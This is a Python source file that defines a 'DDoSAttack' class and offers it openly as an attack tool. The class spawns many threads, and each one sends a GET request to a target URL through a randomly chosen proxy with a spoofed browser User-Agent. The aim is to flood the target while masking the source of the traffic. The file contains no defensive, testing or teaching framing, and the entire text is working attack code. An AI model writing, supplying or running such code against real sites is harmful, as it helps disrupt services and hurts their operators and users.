import threading
import requests
import random
from time import sleep

class DDoSAttack:
    def __init__(self, target_url, proxy_list, thread_count=50):
        self.target_url = target_url
        self.proxy_list = proxy_list
        self.thread_count = thread_count

    def start_attack(self):
        print(f"Starting DDoS attack on {self.target_url} using {self.thread_count} threads.")
        threads = []
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.send_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def send_request(self):
        proxy = random.choice(self.proxy_list)
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            response = requests.get(self.target_url, proxies={'http': proxy, 'https': proxy}, headers=headers)
            print(f"Sent request through proxy {proxy} with response status {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request through proxy {proxy}: {str(e)}")
        
        sleep(random.uniform(0.1, 1.0)) 
